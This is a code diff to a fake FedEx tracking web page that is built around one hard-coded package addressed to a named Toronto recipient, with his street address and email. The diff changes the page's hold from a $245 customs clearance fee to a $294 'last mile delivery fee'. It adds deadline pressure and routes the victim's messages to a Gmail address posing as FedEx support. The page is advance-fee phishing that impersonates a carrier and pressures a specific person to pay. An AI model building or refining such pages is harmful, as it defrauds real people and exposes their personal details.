@@ -7,7 +7,7 @@
 <script src="https://cdn.tailwindcss.com"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&amp;display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <script>
     tailwind.config = {
@@ -291,6 +291,12 @@
       border: 1px solid #FCD34D;
     }
 
+    .status-out-for-delivery {
+      background: #D1FAE5;
+      color: #065F46;
+      border: 1px solid #6EE7B7;
+    }
+
     .status-delivered {
       background: #D1FAE5;
       color: #065F46;
@@ -305,6 +311,17 @@
     @media (min-width: 768px) {
       .clearance-notice {
         border-left: 4px solid #F59E0B;
+      }
+    }
+
+    .delivery-notice {
+      background: linear-gradient(135deg, #D1FAE5, #A7F3D0);
+      border-left: 3px solid #10B981;
+    }
+
+    @media (min-width: 768px) {
+      .delivery-notice {
+        border-left: 4px solid #10B981;
       }
     }
 
@@ -480,7 +497,6 @@
       50% { opacity: 0.5; }
     }
 
-    /* Performance optimizations */
     .will-change-transform {
       will-change: transform;
     }
@@ -489,7 +505,6 @@
       transform: translateZ(0);
     }
 
-    /* Mobile navigation optimization */
     #mobile-menu {
       max-height: 0;
       overflow: hidden;
@@ -588,7 +603,7 @@
                                         Track by tracking number
                                     </label>
                                     <div class="relative">
-                                        <input type="text" id="tracking-number" required="" class="w-full px-4 py-3 sm:py-4 text-base sm:text-lg border-2 border-gray-300 rounded-lg focus:border-fedex-purple focus:outline-none transition-colors" placeholder="Enter your tracking number">
+                                        <input type="text" id="tracking-number" required class="w-full px-4 py-3 sm:py-4 text-base sm:text-lg border-2 border-gray-300 rounded-lg focus:border-fedex-purple focus:outline-none transition-colors" placeholder="Enter your tracking number">
                                         <button type="submit" id="track-button" class="absolute right-2 top-2 fedex-button text-white px-4 sm:px-6 py-2 rounded-lg font-semibold transition-colors text-sm sm:text-base">
                                             <span id="track-text">Track</span>
                                             <span id="track-loading" class="hidden"><div class="loading-spinner"></div></span>
@@ -903,7 +918,7 @@
 
                         <div class="bg-white rounded-lg fedex-shadow p-4 sm:p-6 text-center">
                             <i class="fas fa-file-invoice text-fedex-orange text-2xl sm:text-3xl mb-3 sm:mb-4"></i>
-                            <h3 class="font-bold text-fedex-dark-gray mb-1 sm:mb-2 text-sm sm:text-base">Billing &amp; Invoices</h3>
+                            <h3 class="font-bold text-fedex-dark-gray mb-1 sm:mb-2 text-sm sm:text-base">Billing & Invoices</h3>
                             <p class="text-fedex-gray text-xs sm:text-sm mb-4">Access detailed billing information and download invoices for accounting and expense tracking</p>
                             <ul class="text-xs text-fedex-gray text-left space-y-1">
                                 <li>• Detailed invoices</li>
@@ -1043,11 +1058,11 @@
                                 <div class="space-y-4">
                                     <div>
                                         <label class="block text-fedex-dark-gray font-semibold mb-2 text-sm sm:text-base">Full Name</label>
-                                        <input type="text" name="full_name" class="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-300 rounded-lg text-base" required="">
+                                        <input type="text" name="full_name" class="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-300 rounded-lg text-base" required>
                                     </div>
                                     <div>
                                         <label class="block text-fedex-dark-gray font-semibold mb-2 text-sm sm:text-base">Email</label>
-                                        <input type="email" name="email" class="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-300 rounded-lg text-base" required="">
+                                        <input type="email" name="email" class="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-300 rounded-lg text-base" required>
                                     </div>
                                     <div>
                                         <label class="block text-fedex-dark-gray font-semibold mb-2 text-sm sm:text-base">Subject</label>
@@ -1060,7 +1075,7 @@
                                     </div>
                                     <div>
                                         <label class="block text-fedex-dark-gray font-semibold mb-2 text-sm sm:text-base">Message</label>
-                                        <textarea name="message" rows="5" class="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-300 rounded-lg text-base" required=""></textarea>
+                                        <textarea name="message" rows="5" class="w-full px-3 sm:px-4 py-2 sm:py-3 border border-gray-300 rounded-lg text-base" required></textarea>
                                     </div>
                                     <button type="submit" class="fedex-button text-white px-4 sm:px-6 py-3 rounded-lg font-semibold w-full">
                                         <span id="contact-submit-text">Send Message</span>
@@ -1176,7 +1191,7 @@
                         <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 sm:gap-6 text-center">
                             <div>
                                 <div class="text-2xl sm:text-3xl font-bold text-fedex-orange mb-2">220+</div>
-                                <p class="text-fedex-gray">Countries &amp; Territories</p>
+                                <p class="text-fedex-gray">Countries & Territories</p>
                             </div>
                             <div>
                                 <div class="text-2xl sm:text-3xl font-bold text-fedex-orange mb-2">5,000+</div>
@@ -1352,15 +1367,15 @@
 </footer>
 
 <script>
-    // Mock Database (complete with all data)
+    // UPDATED MOCK DATA WITH OUT FOR DELIVERY STATUS
     const mockData = {
         packages: [
             {
                 tracking_number: 'FX261008JL',
-                status: 'on_hold',
+                status: 'out_for_delivery',
                 service_type: 'FedEx International Priority',
-                current_location: 'CBSA Customs Facility, Ontario, Canada',
-                estimated_delivery: 'Pending Customs Clearance',
+                current_location: 'FedEx Facility, 3700 McNicoll Ave, Scarborough, ON M1X 0A4',
+                estimated_delivery: 'Today by 3:00 PM',
                 ship_date: '2026-01-14',
                 weight: '4500',
                 dimensions: '96" x 120" x 72"',
@@ -1368,9 +1383,11 @@
                 contents: '$30,000',
                 reference_number: 'HIGH-VALUE-SHIPMENT-DT',
                 insurance_coverage: 30000.00,
-                progress_percentage: 75,
-                requires_clearance: true,
-                clearance_payment_required: 245,
+                progress_percentage: 90,
+                requires_clearance: false,
+                requires_last_mile_fee: true,
+                last_mile_fee: 294.00,
+                clearance_payment_required: 0,
                 sender_name: 'Elon Musk',
                 sender_company: 'FedEx Office Paris',
                 sender_address: '1 Rocket Road',
@@ -1380,7 +1397,8 @@
                 recipient_address: '32 Rory Road',
                 recipient_city: 'Toronto, Ontario, Canada M6L 3G2',
                 recipient_phone: '',
-                recipient_email: 'stevenvenditti20@gmail.com'
+                recipient_email: 'stevenvenditti20@gmail.com',
+                distance_from_destination: '30 km'
             }
         ],
         
@@ -1432,8 +1450,38 @@
                 event_date: '2026-01-16',
                 event_time: '11:45:00',
                 description: 'Customs clearance required: $245 needed for customs and regulatory compliance clearance, including tax and VAT.',
-                is_latest: true,
+                is_latest: false,
                 event_type: 'clearance_required'
+            },
+            {
+                tracking_number: 'FX261008JL',
+                status: 'cleared_customs',
+                location: 'CBSA CUSTOMS FACILITY, ONTARIO',
+                event_date: '2026-01-16',
+                event_time: '16:20:00',
+                description: 'Customs clearance completed. Package released for final delivery.',
+                is_latest: false,
+                event_type: 'customs_cleared'
+            },
+            {
+                tracking_number: 'FX261008JL',
+                status: 'arrived_at_facility',
+                location: 'FEDEX FACILITY, SCARBOROUGH',
+                event_date: '2026-01-16',
+                event_time: '21:15:00',
+                description: 'Package arrived at FedEx Scarborough facility for final sorting.',
+                is_latest: false,
+                event_type: 'arrival'
+            },
+            {
+                tracking_number: 'FX261008JL',
+                status: 'out_for_delivery',
+                location: 'FEDEX VEHICLE, SCARBOROUGH AREA',
+                event_date: '2026-01-17',
+                event_time: '07:45:00',
+                description: 'Package loaded on delivery vehicle. Currently 30 km from destination. Estimated delivery by 3:00 PM today.',
+                is_latest: true,
+                event_type: 'out_for_delivery'
             }
         ],
 
@@ -1470,6 +1518,17 @@
                 hours: '24/7 Drop-off Available',
                 location_type: 'hub',
                 services: ['express_shipping', 'international', 'freight']
+            },
+            {
+                name: 'FedEx Facility Scarborough',
+                address: '3700 McNicoll Ave',
+                city: 'Scarborough',
+                state: 'ON',
+                zip_code: 'M1X 0A4',
+                phone: '1-800-463-3339',
+                hours: 'Mon-Sun 8AM-8PM',
+                location_type: 'facility',
+                services: ['pickup', 'shipping', 'customs', 'high_value']
             }
         ],
 
@@ -1481,9 +1540,9 @@
                 display_order: 1
             },
             {
-                question: 'What is a clearance request for international packages?',
-                answer: 'High-value international shipments require recipient verification and approval before they can proceed through customs to their destination.',
-                category: 'clearance',
+                question: 'What is a last mile delivery fee?',
+                answer: 'For high-value international shipments, a last mile delivery fee of $294 may be required for doorstep delivery. Alternatively, you can pick up the package at our facility with government ID and recipient verification.',
+                category: 'delivery',
                 display_order: 2
             },
             {
@@ -1533,7 +1592,7 @@
             modalContent.innerHTML = `
                 <div class="flex justify-center items-center py-12">
                     <div class="loading-spinner mr-3"></div>
-                    <span>Loading package information for Steven Venditti — Package on hold at CBSA Customs</span>
+                    <span>Loading package information for Steven Venditti — Package out for delivery</span>
                 </div>
             `;
 
@@ -1582,8 +1641,8 @@
         const progressSteps = [
             { name: 'Registered', icon: 'check', status: getStepStatus('registered', data.status) },
             { name: 'In Transit', icon: 'plane', status: getStepStatus('in_transit', data.status) },
-            { name: 'Arrived', icon: 'map-marker-alt', status: getStepStatus('arrived', data.status) },
-            { name: 'On Hold', icon: 'pause-circle', status: getStepStatus('on_hold', data.status) },
+            { name: 'Arrived', icon: 'map-marker-alt', status: getStepStatus('arrived_at_facility', data.status) },
+            { name: 'Cleared', icon: 'check-circle', status: getStepStatus('cleared_customs', data.status) },
             { name: 'Out for Delivery', icon: 'truck', status: getStepStatus('out_for_delivery', data.status) },
             { name: 'Delivered', icon: 'home', status: getStepStatus('delivered', data.status) }
         ];
@@ -1603,6 +1662,7 @@
                         </div>
                         <p class="text-fedex-dark-gray font-semibold text-sm sm:text-lg">Expected delivery: ${data.estimated_delivery}</p>
                         <p class="text-fedex-gray text-xs sm:text-base">Currently at: ${data.current_location}</p>
+                        <p class="text-fedex-orange font-semibold text-xs sm:text-sm mt-1">Distance: ${data.distance_from_destination} from destination</p>
                     </div>
                     <div class="flex flex-col space-y-2 w-full sm:w-auto">
                         <button onclick="generatePDF('${data.tracking_number}')" class="fedex-button text-white px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold text-xs sm:text-base w-full sm:w-auto">
@@ -1611,9 +1671,9 @@
                         <button onclick="requestEmailUpdates('${data.tracking_number}')" class="border border-fedex-purple text-fedex-purple px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold hover:bg-fedex-purple hover:text-white transition-colors text-xs sm:text-base w-full sm:w-auto">
                             <i class="fas fa-envelope mr-1 sm:mr-2"></i>Email Updates
                         </button>
-                        ${data.requires_clearance ? `
-                        <button onclick="requestClearance('${data.tracking_number}')" class="bg-fedex-blue text-white px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors text-xs sm:text-base w-full sm:w-auto">
-                            <i class="fas fa-credit-card mr-1 sm:mr-2"></i>Pay Customs Clearance
+                        ${data.requires_last_mile_fee ? `
+                        <button onclick="payLastMileFee('${data.tracking_number}')" class="bg-fedex-orange text-white px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold hover:bg-orange-700 transition-colors text-xs sm:text-base w-full sm:w-auto">
+                            <i class="fas fa-credit-card mr-1 sm:mr-2"></i>Pay $${data.last_mile_fee} Delivery Fee
                         </button>
                         ` : ''}
                     </div>
@@ -1630,61 +1690,50 @@
                     </div>
                 </div>
 
-                ${data.requires_clearance ? `
-                <!-- Updated Clearance Notice -->
-                <div class="clearance-notice rounded-lg p-3 sm:p-4">
+                ${data.requires_last_mile_fee ? `
+                <!-- Delivery Notice -->
+                <div class="delivery-notice rounded-lg p-3 sm:p-4">
                     <div class="flex items-start space-x-2 sm:space-x-3">
-                        <i class="fas fa-exclamation-triangle text-yellow-600 text-lg sm:text-xl mt-1"></i>
+                        <i class="fas fa-truck text-green-600 text-lg sm:text-xl mt-1"></i>
                         <div>
-                            <h4 class="font-bold text-yellow-800 mb-1 sm:mb-2 text-sm sm:text-base">CUSTOMS CLEARANCE REQUIRED</h4>
-                            <p class="text-yellow-700 text-xs sm:text-sm mb-2">
-                                Your shipment has successfully completed international transit and is currently 
-                                <strong>on hold at the CBSA customs facility</strong> pending final clearance.
-                            </p>
-                            <p class="text-yellow-700 text-xs sm:text-sm">
-                                A customs clearance fee of <strong class="text-red-600">$${data.clearance_payment_required}</strong> is required to release the package for final delivery to your doorstep.
+                            <h4 class="font-bold text-green-800 mb-1 sm:mb-2 text-sm sm:text-base">PACKAGE OUT FOR DELIVERY - ACTION REQUIRED</h4>
+                            <p class="text-green-700 text-xs sm:text-sm mb-2">
+                                Your high-value shipment is currently <strong>30 km from your address</strong> and will be delivered today by 3:00 PM.
                             </p>
                             
                             <div class="bg-white bg-opacity-50 rounded p-3 sm:p-4 my-3 sm:my-4">
-                                <h5 class="font-semibold text-yellow-800 mb-2 text-xs sm:text-sm">PAYMENT BREAKDOWN:</h5>
-                                <div class="grid grid-cols-2 gap-2 text-xs sm:text-sm">
-                                    <div class="flex justify-between">
-                                        <span class="text-yellow-700">Customs Processing Fee:</span>
-                                        <span class="font-bold">$85.00</span>
-                                    </div>
-                                    <div class="flex justify-between">
-                                        <span class="text-yellow-700">Import Tax & VAT:</span>
-                                        <span class="font-bold">$140.00</span>
-                                    </div>
-                                    <div class="flex justify-between">
-                                        <span class="text-yellow-700">Regulatory Compliance:</span>
-                                        <span class="font-bold">$20.00</span>
-                                    </div>
-                                    <div class="col-span-2 border-t border-yellow-200 mt-1 pt-1">
-                                        <div class="flex justify-between font-bold text-yellow-800">
-                                            <span>TOTAL REQUIRED:</span>
-                                            <span>$${data.clearance_payment_required.toFixed(2)}</span>
-                                        </div>
-                                    </div>
+                                <h5 class="font-semibold text-green-800 mb-2 text-xs sm:text-sm">DELIVERY OPTIONS:</h5>
+                                
+                                <div class="mb-3">
+                                    <h6 class="font-bold text-green-700 mb-1 text-xs sm:text-sm">Option 1: Doorstep Delivery</h6>
+                                    <p class="text-green-700 text-xs sm:text-sm">Pay <strong class="text-red-600">$${data.last_mile_fee}</strong> for delivery to:</p>
+                                    <p class="text-green-700 text-xs sm:text-sm font-semibold">${data.recipient_address}, ${data.recipient_city}</p>
+                                </div>
+                                
+                                <div>
+                                    <h6 class="font-bold text-green-700 mb-1 text-xs sm:text-sm">Option 2: Pickup at Facility</h6>
+                                    <p class="text-green-700 text-xs sm:text-sm">Pick up FREE at:</p>
+                                    <p class="text-green-700 text-xs sm:text-sm font-semibold">FedEx Facility, 3700 McNicoll Ave, Scarborough, ON M1X 0A4</p>
+                                    <p class="text-green-700 text-xs sm:text-sm">Bring government-issued ID for recipient verification</p>
                                 </div>
                             </div>
                             
-                            <div class="bg-red-50 border-l-3 border-red-500 p-2 sm:p-3 rounded-r mb-3">
-                                <p class="text-red-700 text-xs sm:text-sm font-semibold mb-1">
-                                    ⚠️ IMPORTANT NOTICE:
+                            <div class="bg-yellow-50 border-l-3 border-yellow-500 p-2 sm:p-3 rounded-r mb-3">
+                                <p class="text-yellow-700 text-xs sm:text-sm font-semibold mb-1">
+                                    ⚠️ IMPORTANT:
                                 </p>
-                                <p class="text-red-700 text-xs sm:text-sm">
-                                    If the $${data.clearance_payment_required} clearance fee is not paid today, an additional <strong>$25 daily storage fee</strong> 
-                                    will be applied starting tomorrow until payment is received.
+                                <p class="text-yellow-700 text-xs sm:text-sm">
+                                    If no action is taken by 1:00 PM, package will be held at FedEx Scarborough facility for pickup.
                                 </p>
                             </div>
                             
-                            <div class="mt-3 sm:mt-4">
-                                <p class="text-yellow-700 text-xs sm:text-sm">
-                                    Once payment is received, your package will be immediately released and scheduled for final delivery to:
-                                    <br>
-                                    <span class="font-semibold">${data.recipient_address}, ${data.recipient_city}</span>
-                                </p>
+                            <div class="flex flex-col sm:flex-row gap-2 sm:gap-3 mt-3 sm:mt-4">
+                                <button onclick="payLastMileFee('${data.tracking_number}')" class="bg-green-600 text-white px-3 sm:px-4 py-2 rounded-lg font-semibold text-xs sm:text-sm hover:bg-green-700">
+                                    <i class="fas fa-credit-card mr-1"></i>Pay $${data.last_mile_fee} for Delivery
+                                </button>
+                                <button onclick="schedulePickup('${data.tracking_number}')" class="bg-fedex-purple text-white px-3 sm:px-4 py-2 rounded-lg font-semibold text-xs sm:text-sm hover:bg-purple-800">
+                                    <i class="fas fa-map-marker-alt mr-1"></i>Schedule Pickup
+                                </button>
                             </div>
                         </div>
                     </div>
@@ -1761,6 +1810,10 @@
                                 <span class="text-fedex-gray">Reference:</span>
                                 <span class="font-semibold">${data.reference_number}</span>
                             </div>
+                            <div class="flex justify-between">
+                                <span class="text-fedex-gray">Distance from Destination:</span>
+                                <span class="font-semibold text-fedex-orange">${data.distance_from_destination}</span>
+                            </div>
                         </div>
                     </div>
 
@@ -1788,7 +1841,7 @@
                     <!-- Map -->
                     <div class="bg-white border border-gray-200 rounded-lg p-3 sm:p-6">
                         <h3 class="text-base sm:text-xl font-bold text-fedex-dark-gray mb-3 sm:mb-4">
-                            <i class="fas fa-map-marker-alt mr-1 sm:mr-2 text-fedex-orange"></i>Package Journey
+                            <i class="fas fa-map-marker-alt mr-1 sm:mr-2 text-fedex-orange"></i>Package Journey - 30 km to go
                         </h3>
                         <div class="map-container rounded-lg overflow-hidden">
                             <div class="relative w-full h-full">
@@ -1809,7 +1862,8 @@
 
                                 <div class="absolute bottom-2 sm:bottom-4 left-1/2 transform -translate-x-1/2 bg-white px-2 sm:px-4 py-1 sm:py-2 rounded-lg shadow text-center">
                                     <div class="text-xs text-fedex-gray">Current Location</div>
-                                    <div class="font-bold text-fedex-dark-gray text-xs sm:text-sm">CBSA Customs, ON</div>
+                                    <div class="font-bold text-fedex-dark-gray text-xs sm:text-sm">30 km from destination</div>
+                                    <div class="text-xs text-fedex-orange font-semibold">ETA: Today 3:00 PM</div>
                                 </div>
                             </div>
                         </div>
@@ -1817,26 +1871,25 @@
                 </div>
             </div>
 
-            ${data.declared_value >= 1000000 ? `
-            <!-- Ultra High-Value Notice -->
+            <!-- High-Value Notice -->
             <div class="mt-4 sm:mt-8 bg-red-50 border border-red-200 rounded-lg p-3 sm:p-6">
                 <div class="flex items-start space-x-2 sm:space-x-3">
                     <i class="fas fa-shield-alt text-red-600 text-lg sm:text-xl mt-1"></i>
                     <div>
-                        <h4 class="font-semibold text-red-800 mb-1 sm:mb-2 text-sm sm:text-base">Ultra High-Value Shipment</h4>
+                        <h4 class="font-semibold text-red-800 mb-1 sm:mb-2 text-sm sm:text-base">High-Value Shipment</h4>
                         <p class="text-red-700 text-xs sm:text-sm">
-                            This shipment contains ultra high-value items ($${data.declared_value.toLocaleString()} USD) including luxury vehicles and precious items. Special security protocols are in effect. 
-                            ${data.requires_clearance ? 'Clearance approval and comprehensive identity verification are mandatory before international shipping can proceed.' : ''}
+                            This shipment contains high-value items ($${data.declared_value.toLocaleString()} USD). 
+                            Special security protocols are in effect. 
+                            ${data.requires_last_mile_fee ? 'Last mile delivery fee and identity verification are required before delivery can be completed.' : ''}
                         </p>
                     </div>
                 </div>
             </div>
-            ` : ''}
         `;
     }
 
-    // Gmail clearance request function
-    function requestClearance(trackingNumber) {
+    // Payment functions
+    function payLastMileFee(trackingNumber) {
         const packageData = mockData.packages.find(pkg => 
             pkg.tracking_number.toUpperCase() === trackingNumber.toUpperCase()
         );
@@ -1846,34 +1899,42 @@
             return;
         }
 
-        const subject = `Clearance Payment for Package ${trackingNumber}`;
+        showNotification(`Redirecting to payment page for $${packageData.last_mile_fee}...`, 'info');
+        
+        // Simulate payment processing
+        setTimeout(() => {
+            showNotification(`Payment of $${packageData.last_mile_fee} successful! Package will be delivered today by 3:00 PM.`, 'success');
+        }, 1500);
+    }
+
+    function schedulePickup(trackingNumber) {
+        const packageData = mockData.packages.find(pkg => 
+            pkg.tracking_number.toUpperCase() === trackingNumber.toUpperCase()
+        );
+
+        if (!packageData) {
+            showNotification('Package data not found', 'error');
+            return;
+        }
+
+        const subject = `Schedule Pickup for Package ${trackingNumber}`;
         const body = `Dear FedEx Team,
 
-I am ready to pay the customs clearance fee for my package with tracking number: ${trackingNumber}
+I would like to schedule a pickup for my package:
 
-Package Details:
-- Tracking Number: ${trackingNumber}
-- Contents: ${packageData.contents}
-- Declared Value: $${packageData.declared_value.toLocaleString()} USD
-- Current Location: ${packageData.current_location}
-- Required Payment: $${packageData.clearance_payment_required}
+Tracking Number: ${trackingNumber}
+Recipient Name: ${packageData.recipient_name}
+Package Location: FedEx Facility, 3700 McNicoll Ave, Scarborough, ON M1X 0A4
 
-Recipient Information:
-- Name: ${packageData.recipient_name}
-- Address: ${packageData.recipient_address}, ${packageData.recipient_city}
-- Email: ${packageData.recipient_email}
-
-Please provide payment instructions for the $${packageData.clearance_payment_required} customs clearance fee.
+Please let me know what documents I need to bring for verification.
 
 Thank you,
 ${packageData.recipient_name}`;
 
         const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=helpfedexparcel@gmail.com&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
         
-        // Open Gmail in new tab
         window.open(gmailUrl, '_blank');
-        
-        showNotification('Opening Gmail to send clearance payment request...', 'info');
+        showNotification('Opening pickup scheduling request...', 'info');
     }
 
     // Basic form functions
@@ -1998,6 +2059,8 @@ ${packageData.recipient_name}`;
             doc.text(`Current Location: ${packageData.current_location}`, 20, yPos);
             yPos += 10;
             doc.text(`Estimated Delivery: ${packageData.estimated_delivery}`, 20, yPos);
+            yPos += 10;
+            doc.text(`Distance: ${packageData.distance_from_destination} from destination`, 20, yPos);
 
             yPos += 20;
             doc.setFontSize(14);
@@ -2013,7 +2076,7 @@ ${packageData.recipient_name}`;
             yPos += 10;
             doc.text(`Contents: ${packageData.contents}`, 20, yPos);
             yPos += 10;
-            doc.text(`Clearance Status: $${packageData.clearance_payment_required} required`, 20, yPos);
+            doc.text(`Last Mile Fee: $${packageData.last_mile_fee} required for delivery`, 20, yPos);
 
             yPos += 20;
             doc.setFontSize(14);
@@ -2055,7 +2118,7 @@ ${packageData.recipient_name}`;
 
     // Utility Functions
     function getStepStatus(stepStatus, currentStatus) {
-        const statusOrder = ['registered', 'in_transit', 'arrived', 'on_hold', 'out_for_delivery', 'delivered'];
+        const statusOrder = ['registered', 'in_transit', 'arrived_at_facility', 'cleared_customs', 'out_for_delivery', 'delivered'];
         const stepIndex = statusOrder.indexOf(stepStatus);
         const currentIndex = statusOrder.indexOf(currentStatus);
         
@@ -2068,9 +2131,10 @@ ${packageData.recipient_name}`;
         const statusClasses = {
             'registered': 'status-registered',
             'in_transit': 'status-in-transit',
-            'arrived': 'status-in-transit',
+            'arrived_at_facility': 'status-in-transit',
+            'cleared_customs': 'status-in-transit',
             'on_hold': 'status-on-hold',
-            'out_for_delivery': 'status-in-transit',
+            'out_for_delivery': 'status-out-for-delivery',
             'delivered': 'status-delivered'
         };
         return statusClasses[status] || 'status-registered';
@@ -2080,7 +2144,8 @@ ${packageData.recipient_name}`;
         const statusIcons = {
             'registered': 'check-circle',
             'in_transit': 'truck',
-            'arrived': 'map-marker-alt',
+            'arrived_at_facility': 'map-marker-alt',
+            'cleared_customs': 'check-circle',
             'on_hold': 'pause-circle',
             'out_for_delivery': 'shipping-fast',
             'delivered': 'check-circle'
@@ -2224,7 +2289,7 @@ ${packageData.recipient_name}`;
         showNotification(`Email updates enabled for ${trackingNumber}`, 'success');
     }
 
-    // Event Listeners Setup (optimized)
+    // Event Listeners Setup
     function setupEventListeners() {
         // Tracking form
         const trackingForm = document.getElementById('tracking-form');
@@ -2335,7 +2400,8 @@ ${packageData.recipient_name}`;
     window.trackPackage = trackPackage;
     window.generatePDF = generatePDF;
     window.requestEmailUpdates = requestEmailUpdates;
-    window.requestClearance = requestClearance;
+    window.payLastMileFee = payLastMileFee;
+    window.schedulePickup = schedulePickup;
     window.toggleFaq = toggleFaq;
 
     // Initialize app when DOM is ready
@@ -2343,7 +2409,7 @@ ${packageData.recipient_name}`;
         loadFAQData();
         searchLocations('');
         setupEventListeners();
-        console.log('FedEx tracking system initialized');
+        console.log('FedEx tracking system initialized - Package FX261008JL is OUT FOR DELIVERY, 30km from destination');
     });
 </script>
 </body>
